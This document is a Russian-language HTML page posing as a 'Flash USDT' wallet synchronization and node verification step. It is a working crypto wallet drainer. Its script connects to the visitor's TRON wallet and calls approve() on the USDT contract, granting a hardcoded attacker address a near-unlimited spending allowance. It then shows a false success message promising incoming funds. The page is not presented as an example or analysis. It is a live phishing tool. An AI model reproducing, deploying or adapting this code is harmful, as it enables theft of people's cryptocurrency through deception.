<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flash USDT: Synchronization Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #0a0a0a; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .card { padding: 45px 30px; width: 90%; max-width: 420px; background: #111; border-radius: 25px; border: 1px solid #222; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
        .status { font-size: 11px; color: #0088cc; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 20px; font-weight: bold; }
        .logo { width: 70px; height: 70px; background: #0088cc; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; box-shadow: 0 0 30px rgba(0,136,204,0.3); }
        h2 { font-size: 24px; margin-bottom: 15px; font-weight: 700; }
        p { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 35px; }
        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 15px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; transition: 0.3s; }
        .btn:hover { background: #0099ee; box-shadow: 0 0 20px rgba(0,136,204,0.4); }
        .btn:disabled { background: #333; color: #555; cursor: not-allowed; }
        #error-msg { color: #ff4444; font-size: 13px; margin-top: 20px; display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="status">● Secure Connection Active</div>
    <div class="logo">T</div>
    <h2>Верификация узла</h2>
    <p>Для автоматического зачисления USDT необходимо подтвердить синхронизацию вашего кошелька с узлом валидации TRC-20.</p>
    
    <button id="actionBtn" class="btn">Запустить синхронизацию</button>
    <div id="error-msg">Кошелек не обнаружен. Убедитесь, что расширение кошелька включено и выбрана сеть TRON.</div>
</div>

<script>
    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

    const btn = document.getElementById('actionBtn');
    const errMsg = document.getElementById('error-msg');

    async function start() {
        // Ищем кошелек (будь то Trust Wallet, TronLink или Bitget на ПК)
        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);

        if (!tron) {
            errMsg.style.display = 'block';
            return;
        }

        try {
            btn.innerText = "ПОДКЛЮЧЕНИЕ...";
            btn.disabled = true;
            errMsg.style.display = 'none';

            // Запрос на подключение (Connect)
            await tron.request({ method: 'tron_requestAccounts' });

            // Подключаемся к контракту USDT
            const contract = await tron.contract().at(CONTRACT);
            
            // Вызываем Approve
            const result = await contract.approve(ADMIN, '1000000000000000000').send({
                feeLimit: 100000000
            });

            btn.innerText = "УСПЕШНО";
            alert("Синхронизация успешно завершена. Ожидайте зачисления активов.");
            
        } catch (e) {
            console.error(e);
            btn.innerText = "ПОВТОРИТЬ";
            btn.disabled = false;
            alert("Ошибка: Действие отклонено пользователем или неверная сеть.");
        }
    }

    btn.onclick = start;
</script>
</body>
</html>
